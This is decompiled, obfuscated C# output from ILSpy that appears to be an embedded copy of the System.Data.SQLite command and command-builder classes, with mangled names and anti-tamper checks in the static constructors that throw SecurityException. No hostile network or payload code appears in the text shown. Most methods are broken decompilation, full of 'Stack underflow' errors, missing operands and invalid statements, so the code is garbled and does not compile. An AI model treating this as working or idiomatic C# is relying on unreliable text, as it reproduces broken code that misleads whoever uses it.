		internal global::_0015._0017 _0001;

		internal IntPtr _0001;

		internal byte[] _0001;

		internal IntPtr _0002;

		internal byte[] _0002;

		internal _0080._0017 _0001;

		internal bool _0001;

		internal _001A(global::_0011._0013 _0013_0017_0006, global::_0015._0017 _0089_0016_0006, IntPtr _0014_0017_0006, byte[] _0015_0017_0006, IntPtr _0016_0017_0006, byte[] _0017_0017_0006)
		{
			this._0001 = _0013_0017_0006;
			this._0001 = _0089_0016_0006;
			this._0001 = _0014_0017_0006;
			this._0001 = _0015_0017_0006;
			this._0002 = _0016_0017_0006;
			this._0002 = _0017_0017_0006;
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_001A)/*Error near IL_001a: Stack underflow*/, true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0011._0018._0001((_001A)/*Error near IL_000f: Stack underflow*/, false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _001A()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000F
{
	internal interface _0011
	{
		void _0001(_0017._0080 _0002);
	}
}
namespace _0004
{
	[Flags]
	internal enum _0015
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 4,
		_0005 = 0x40,
		_0006 = 0x80,
		_0007 = 6
	}
}
namespace _0003
{
	internal enum _0013
	{
		_0001 = 0,
		_0002 = 1001,
		_0003 = 1002,
		_0004 = 1003,
		_0005 = 1004,
		_0006 = 1005
	}
}
namespace _0016
{
	internal enum _001B
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 3,
		_0005 = 4,
		_0006 = 5,
		_0007 = 6,
		_0008 = 7,
		_000E = 8,
		_000F = 9,
		_0010 = 10,
		_0011 = 11,
		_0012 = 13,
		_0013 = 14,
		_0014 = 15,
		_0015 = 16,
		_0016 = 17,
		_0017 = 18,
		_0018 = 19,
		_0019 = 20,
		_001A = 21,
		_001B = 22,
		_001C = 23,
		_001D = 24,
		_001E = 25
	}
}
namespace _0004
{
	internal sealed class _0016 : IDisposable
	{
		internal global::_0011._0013 _0001;

		internal global::_0010._0080 _0001;

		internal bool _0001;

		internal _0016(global::_0011._0013 _0013_0017_0006, global::_0010._0080 _0092_0016_0006)
		{
			this._0001 = _0013_0017_0006;
			this._0001 = _0092_0016_0006;
		}

		public void _0001(long _0002)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0016)/*Error near IL_0037: Stack underflow*/);
			global::_0011._0018._0001((_0016)/*Error near IL_000b: Stack underflow*/);
			_0080._0017 obj = global::_0011._0018._0001(global::_0010._0080._0001(this._0001), _0002);
			if (obj != 0)
			{
				this._0002();
				throw new SQLiteException(obj, null);
			}
		}

		public void _0001()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			((_0016)/*Error near IL_000d: Stack underflow*/)._0002();
		}

		public void _0002()
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 2
			_ = 1;
			global::_0011._0018._0001((byte)/*Error near IL_001a: Stack underflow*/ != 0, (_0016)/*Error near IL_001a: Stack underflow*/);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002();
		}

		protected override void _0003()
		{
			//IL_0008: Incompatible stack heights: 0 vs 2
			try
			{
				_ = 0;
				global::_0011._0018._0001((byte)/*Error near IL_000f: Stack underflow*/ != 0, (_0016)/*Error near IL_000f: Stack underflow*/);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}
	}
}
namespace _0010
{
	[ToolboxItem(true)]
	[Designer("SQLite.Designer.SQLiteCommandDesigner, SQLite.Designer, Version=1.0.105.2, Culture=neutral, PublicKeyToken=db937bc2d44ff139")]
	internal sealed class _001C : DbCommand, ICloneable
	{
		internal static readonly string _0001;

		internal string _0002;

		internal global::_0017._0080 _0001;

		internal int _0001;

		internal WeakReference _0001;

		internal int _0002;

		private bool m__0001;

		private UpdateRowSource m__0001;

		internal global::_0007._001E _0001;

		internal List<global::_0013._0017> _0001;

		internal string _0003;

		private _007F m__0001;

		internal bool _0002;

		[DefaultValue("")]
		[RefreshProperties(RefreshProperties.All)]
		[Editor("Microsoft.VSDesigner.Data.SQL.Design.SqlCommandTextEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
		public override string CommandText
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0014: Stack underflow*/);
				return ((_001C)/*Error near IL_000b: Stack underflow*/)._0002;
			}
			set
			{
				//IL_0059: Incompatible stack heights: 0 vs 1
				//IL_0063: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_001C)/*Error near IL_0060: Stack underflow*/);
				_ = _0010_0003._008B_0006;
				string text = ((_001C)/*Error near IL_0010: Stack underflow*/)._0002;
				if (!/*Error near IL_0016: Stack underflow*/(text, value))
				{
					if (this._0001 != null && global::_001B._007E_008C_0003(this._0001))
					{
						throw new InvalidOperationException(global::_0080._0014._0001(107402690));
					}
					global::_0011._0018._0001(this);
					this._0002 = value;
					_ = this._0001;
				}
			}
		}

		[DefaultValue(30)]
		public override int CommandTimeout
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0014: Stack underflow*/);
				return ((_001C)/*Error near IL_000b: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0015: Stack underflow*/);
				((_001C)/*Error near IL_000c: Stack underflow*/)._0002 = value;
			}
		}

		[RefreshProperties(RefreshProperties.All)]
		[DefaultValue(CommandType.Text)]
		public override CommandType CommandType
		{
			get
			{
				//IL_0007: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_000e: Stack underflow*/);
				return CommandType.Text;
			}
			set
			{
				//IL_0007: Invalid comparison between Unknown and I4
				//IL_0011: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0018: Stack underflow*/);
				if ((int)/*Error near IL_0009: Stack underflow*/ != 1)
				{
					throw new NotSupportedException();
				}
			}
		}

		[Editor("Microsoft.VSDesigner.Data.Design.DbConnectionEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
		[DefaultValue(null)]
		public new global::_0017._0080 Connection
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0014: Stack underflow*/);
				return ((_001C)/*Error near IL_000b: Stack underflow*/)._0001;
			}
			set
			{
				//IL_005f: Incompatible stack heights: 0 vs 1
				//IL_0069: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0066: Stack underflow*/);
				if (((_001C)/*Error near IL_000b: Stack underflow*/)._0001 != null && global::_001B._007E_008C_0003(this._0001))
				{
					throw new InvalidOperationException(global::_0080._0014._0001(107402653));
				}
				if (this._0001 != null)
				{
					global::_0011._0018._0001(this);
				}
				this._0001 = value;
				if (this._0001 != null)
				{
					this._0001 = this._0001._0017;
				}
			}
		}

		protected override DbConnection DbConnection
		{
			get
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				_ = ((_001C)/*Error near IL_000d: Stack underflow*/).Connection;
				return (DbConnection)/*Error near IL_0005: Stack underflow*/;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				global::_0017._0080 obj = (global::_0017._0080)/*Error near IL_0005: Stack underflow*/;
				((_001C)/*Error near IL_0017: Stack underflow*/).Connection = obj;
			}
		}

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		public new global::_0007._001E Parameters
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0014: Stack underflow*/);
				return ((_001C)/*Error near IL_000b: Stack underflow*/)._0001;
			}
		}

		protected override DbParameterCollection DbParameterCollection
		{
			get
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				_ = ((_001C)/*Error near IL_000d: Stack underflow*/).Parameters;
				return (DbParameterCollection)/*Error near IL_0005: Stack underflow*/;
			}
		}

		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		public new _007F Transaction
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0014: Stack underflow*/);
				return ((_001C)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_007e: Incompatible stack heights: 0 vs 1
				//IL_008e: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0088: Stack underflow*/);
				if (((_001C)/*Error near IL_0011: Stack underflow*/)._0001 != null)
				{
					if (this._0001 != null && global::_001B._007E_008C_0003(this._0001))
					{
						throw new InvalidOperationException(global::_0080._0014._0001(107402584));
					}
					if (value != null && ((global::_0003._0016)value)._0001 != this._0001)
					{
						throw new ArgumentException(global::_0080._0014._0001(107402515));
					}
					this.m__0001 = value;
				}
				else
				{
					if (value != null)
					{
						Connection = value.Connection;
					}
					this.m__0001 = value;
				}
			}
		}

		protected override DbTransaction DbTransaction
		{
			get
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				_ = ((_001C)/*Error near IL_000d: Stack underflow*/).Transaction;
				return (DbTransaction)/*Error near IL_0005: Stack underflow*/;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				_007F obj = (_007F)/*Error near IL_0005: Stack underflow*/;
				((_001C)/*Error near IL_0017: Stack underflow*/).Transaction = obj;
			}
		}

		[DefaultValue(UpdateRowSource.None)]
		public override UpdateRowSource UpdatedRowSource
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0014: Stack underflow*/);
				return ((_001C)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0015: Stack underflow*/);
				((_001C)/*Error near IL_000c: Stack underflow*/).m__0001 = value;
			}
		}

		[DesignOnly(true)]
		[DefaultValue(true)]
		[Browsable(false)]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override bool DesignTimeVisible
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0014: Stack underflow*/);
				return ((_001C)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0019: Incompatible stack heights: 0 vs 1
				//IL_0023: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_001C)/*Error near IL_0020: Stack underflow*/);
				((_001C)/*Error near IL_000c: Stack underflow*/).m__0001 = value;
				_0091_0002._009F_0005(this);
			}
		}

		public _001C()
			: this(null, null)
		{
		}

		public _001C(string _0096_0017_0006)
			: this(_0096_0017_0006, null, null)
		{
		}

		public _001C(string _0096_0017_0006, global::_0017._0080 _001B_0013_0006)
			: this(_0096_0017_0006, _001B_0013_0006, null)
		{
		}

		public _001C(global::_0017._0080 _001B_0013_0006)
			: this(null, _001B_0013_0006, null)
		{
		}

		private _001C(_001C _001D_0013)
			: this(_001D_0013.CommandText, _001D_0013.Connection, _001D_0013.Transaction)
		{
			CommandTimeout = _001D_0013.CommandTimeout;
			DesignTimeVisible = _001D_0013.DesignTimeVisible;
			UpdatedRowSource = _001D_0013.UpdatedRowSource;
			foreach (global::_0011._0016 item in _001D_0013._0001)
			{
				Parameters.Add(item._0002());
			}
		}

		public _001C(string _0096_0017_0006, global::_0017._0080 _001B_0013_0006, _007F _0004_0018_0006)
		{
			this._0002 = 30;
			this._0001 = new global::_0007._001E(this);
			this.m__0001 = true;
			this.m__0001 = UpdateRowSource.None;
			if (_0096_0017_0006 != null)
			{
				CommandText = _0096_0017_0006;
			}
			if (_001B_0013_0006 != null)
			{
				DbConnection = _001B_0013_0006;
				this._0002 = _001B_0013_0006.DefaultTimeout;
			}
			if (_0004_0018_0006 != null)
			{
				Transaction = _0004_0018_0006;
			}
			global::_0017._0080._0001(_001B_0013_0006, new global::_0002._001A(global::_000E._001D._000E, null, _0004_0018_0006, this, null, null, null, null));
		}

		[Conditional("CHECK_STATE")]
		internal static void _0001(_001C _0002)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				global::_0080._0014._0001(107402703);
				new ArgumentNullException((string?)/*Error near IL_0024: Stack underflow*/);
				throw /*Error near IL_000e: Stack underflow*/;
			}
			global::_0011._0018._0001(_0002);
		}

		protected override void _0001(bool _0002)
		{
			//IL_00c8: Incompatible stack heights: 0 vs 1
			//IL_00ce: Incompatible stack heights: 0 vs 4
			//IL_00d4: Incompatible stack heights: 0 vs 2
			_ = ((_001C)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = 12;
			_ = null;
			_ = ((_001C)/*Error near IL_0017: Stack underflow*/).m__0001;
			global::_0017._0080._0001(_0003: new global::_0002._001A(_001D_0017_0006: null, _0015_0019_0006: null, _0019_008E_0003: null, _0087_000F: new object[2] { _0002, this._0002 }, _0014_0019_0006: (global::_000E._001D)/*Error near IL_0043: Stack underflow*/, _001E_009E_0005: (StateChangeEventArgs)/*Error near IL_0043: Stack underflow*/, _0004_0018_0006: (IDbTransaction)/*Error near IL_0043: Stack underflow*/, _0008_0019: (IDbCommand)/*Error near IL_0043: Stack underflow*/), _0002: (global::_0017._0080)/*Error near IL_0048: Stack underflow*/);
			bool flag = false;
			try
			{
				if (this._0002 || !_0002)
				{
					return;
				}
				global::_0011._0014 obj6 = null;
				if (this._0001 != null)
				{
					try
					{
						obj6 = _0083_0003._007E_001A_0007(this._0001) as global::_0011._0014;
					}
					catch (InvalidOperationException)
					{
					}
				}
				if (obj6 != null)
				{
					obj6._0001 = true;
					this._0001 = null;
					flag = true;
				}
				else
				{
					Connection = null;
					global::_0008._007E_000E_0002(this._0001);
					this._0002 = null;
				}
			}
			finally
			{
				if (!flag)
				{
					global::_0005._008C(this, _0002);
					this._0002 = true;
				}
			}
		}

		public override void _0001()
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001C)/*Error near IL_0036: Stack underflow*/);
			if (((_001C)/*Error near IL_000b: Stack underflow*/)._0001 != null && _0083_0003._007E_001A_0007(this._0001) is global::_0011._0014 obj)
			{
				obj._0006 = 0;
			}
		}

		protected override DbParameter _0001()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001C)/*Error near IL_000d: Stack underflow*/);
			return (DbParameter)/*Error near IL_0005: Stack underflow*/;
		}

		public void _0002()
		{
			//IL_00f0: Incompatible stack heights: 0 vs 1
			//IL_0100: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001C)/*Error near IL_00fa: Stack underflow*/);
			global::_0017._0080 obj = ((_001C)/*Error near IL_0014: Stack underflow*/)._0001;
			global::_0011._0013 obj2 = obj._0001;
			if (obj == null || obj2 == null)
			{
				throw new SQLiteException(global::_0080._0014._0001(107401890));
			}
			List<global::_0013._0017> list = null;
			global::_0013._0017 obj3 = null;
			try
			{
				string text = this._0002;
				uint num = (uint)(this._0002 * 1000);
				global::_0013._0017 obj4 = null;
				while (text != null && global::_001A._007E_0016_0003(text) > 0)
				{
					obj3 = obj2._0001(obj, text, obj4, num, ref text);
					obj4 = obj3;
					if (obj3 != null)
					{
						if (list == null)
						{
							list = new List<global::_0013._0017>();
						}
						list.Add(obj3);
						obj3 = null;
					}
					if (text != null)
					{
						text = global::_0002._007E_000F(text);
					}
				}
			}
			finally
			{
				if (obj3 != null)
				{
					obj3._0001();
					obj3 = null;
				}
				if (list != null)
				{
					foreach (global::_0013._0017 item in list)
					{
						item?._0001();
					}
					list.Clear();
					list = null;
				}
			}
		}

		protected override DbDataReader _0001(CommandBehavior _0002)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((CommandBehavior)/*Error near IL_0012: Stack underflow*/, (_001C)/*Error near IL_0012: Stack underflow*/);
			return (DbDataReader)/*Error near IL_0007: Stack underflow*/;
		}

		public override int _0002()
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001C)/*Error near IL_0015: Stack underflow*/);
			return global::_0011._0018._0001((_001C)/*Error near IL_000c: Stack underflow*/, CommandBehavior.Default);
		}

		public override object _0001()
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001C)/*Error near IL_0015: Stack underflow*/);
			return global::_0011._0018._0001((_001C)/*Error near IL_000c: Stack underflow*/, CommandBehavior.Default);
		}

		public void _0001(bool _0002, bool _0003)
		{
			//IL_00b8: Incompatible stack heights: 0 vs 1
			//IL_00c8: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001C)/*Error near IL_00c2: Stack underflow*/);
			if ((int)/*Error near IL_0011: Stack underflow*/ != 0 && this._0001 != null)
			{
				this._0001._0001 = true;
			}
			global::_0011._0018._0001(this);
			if (this._0001 == null)
			{
				return;
			}
			global::_0011._0013 obj = this._0001._0001;
			foreach (global::_0013._0017 item in this._0001)
			{
				if (item == null)
				{
					continue;
				}
				global::_0001._001F obj2 = item._0001;
				if (obj2 != null)
				{
					global::_0080._0017 obj3 = obj._0001(item);
					if (obj3 == global::_0080._0017._0002 && _0002 && global::_0002._0019.SQLiteVersionNumber >= 3003007)
					{
						obj3 = global::_0011._0018._0001(global::_0001._001F._0001(obj2));
					}
					if (!_0003 && obj3 != 0)
					{
						throw new SQLiteException(obj3, obj._0002());
					}
				}
			}
		}

		public override void _0003()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001C)/*Error near IL_000d: Stack underflow*/);
		}

		public object _0002()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001C)/*Error near IL_0014: Stack underflow*/);
			return new _001C((_001C)/*Error near IL_000b: Stack underflow*/);
		}

		object ICloneable.Clone()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0002();
		}

		static _001C()
		{
			//IL_00c8: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00ce: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
			_001C._0001 = global::_0080._0014._0001(107401881);
		}
	}
}
namespace _001D
{
	internal sealed class _0019 : DbCommandBuilder
	{
		internal bool _0001;

		public new _001E._0013 DataAdapter
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_001e: Stack underflow*/);
				_ = _0008_0004._0014_0008;
				return (_001E._0013)/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_001a: Stack underflow*/);
				_ = _000F_0004._0016_0008;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		[Browsable(false)]
		public override CatalogLocation CatalogLocation
		{
			get
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_0019: Stack underflow*/);
				_ = _0010_0004._0017_0008;
				return /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_001a: Stack underflow*/);
				_ = _0011_0004._0018_0008;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		[Browsable(false)]
		public override string CatalogSeparator
		{
			get
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_0019: Stack underflow*/);
				_ = global::_0002._0010;
				return /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_001a: Stack underflow*/);
				_ = _0082_0003._0008_0007;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		[DefaultValue("[")]
		[Browsable(false)]
		public override string QuotePrefix
		{
			get
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_0019: Stack underflow*/);
				_ = global::_0002._0011;
				return /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_001a: Stack underflow*/);
				_ = _0082_0003._000E_0007;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		[Browsable(false)]
		public override string QuoteSuffix
		{
			get
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_0019: Stack underflow*/);
				_ = global::_0002._0012;
				return /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_001a: Stack underflow*/);
				_ = _0082_0003._000F_0007;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		[Browsable(false)]
		public override string SchemaSeparator
		{
			get
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_0019: Stack underflow*/);
				_ = global::_0002._0013;
				return /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0019)/*Error near IL_001a: Stack underflow*/);
				_ = _0082_0003._0010_0007;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		public _0019()
			: this(null)
		{
		}

		public _0019(_001E._0013 _008C_001D_0002)
		{
			QuotePrefix = _0080._0014._0001(107401852);
			QuoteSuffix = _0080._0014._0001(107401847);
			DataAdapter = _008C_001D_0002;
		}

		protected override void _0001(bool _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((_0019)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			finally
			{
				global::_0005._008D(this, _0002);
				this._0001 = true;
			}
		}

		protected override void _0001(DbParameter _0002, DataRow _0003, StatementType _0004, bool _0005)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			global::_0011._0016 obj = (global::_0011._0016)/*Error near IL_0003: Stack underflow*/;
			_ = _0007_0004._007E_0013_0008;
			DbType num = (DbType)_0006_0004._007E_0010_0008(_0003, SchemaTableColumn.ProviderType);
			/*Error near IL_002a: Stack underflow*/((object)/*Error near IL_002a: Stack underflow*/, num);
		}

		protected override string _0001(string _0002)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			_008F_0003._008B_0007();
			_0080._0014._0001(107401842);
			object[] array = new object[1];
			object[] array2 = default(object[]);
			if (0 == 0)
			{
				array2 = array;
			}
			array2[0] = _0002;
			return global::_0011._0018._0001((IFormatProvider)/*Error near IL_0022: Stack underflow*/, (string)/*Error near IL_0022: Stack underflow*/, array2);
		}

		protected override string _0001(int _0002)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			_008F_0003._008B_0007();
			_0080._0014._0001(107401801);
			return global::_0011._0018._0001(_0004: new object[1] { _0002 }, _0002: (IFormatProvider)/*Error near IL_0025: Stack underflow*/, _0003: (string)/*Error near IL_0025: Stack underflow*/);
		}

		protected override string _0002(int _0002)
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _009E_0003._007E_009F_0007;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/, (int)/*Error near IL_0017: Stack underflow*/);
			return (string)/*Error near IL_000c: Stack underflow*/;
		}

		protected override void _0001(DbDataAdapter _0002)
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 2
			//IL_0048: Incompatible stack heights: 0 vs 1
			_ = _0008_0004._0014_0008;
			/*Error near IL_0048: Stack underflow*/((object)/*Error near IL_0048: Stack underflow*/);
			if (/*Error near IL_000d: Stack underflow*/ == /*Error near IL_000d: Stack underflow*/)
			{
				((_001E._0013)_0002).RowUpdating -= _0001;
			}
			else
			{
				((_001E._0013)_0002).RowUpdating += _0001;
			}
		}

		private void _0001(object _0002, RowUpdatingEventArgs _0003)
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			//IL_0010: Incompatible stack heights: 0 vs 1
			_ = _000E_0004._0015_0008;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/, (RowUpdatingEventArgs)/*Error near IL_0017: Stack underflow*/);
		}

		public override string _0002(string _0002)
		{
			//IL_00a3: Incompatible stack heights: 0 vs 1
			//IL_00b3: Incompatible stack heights: 0 vs 3
			global::_0011._0018._0001((_0019)/*Error near IL_00ad: Stack underflow*/);
			_ = global::_001C._0096_0003;
			_ = global::_0002._007E_0011;
			string text = /*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			if (/*Error near IL_0023: Stack underflow*/(text) || global::_001C._0096_0003(global::_0002._007E_0012(this)) || global::_001C._0096_0003(_0002))
			{
				return _0002;
			}
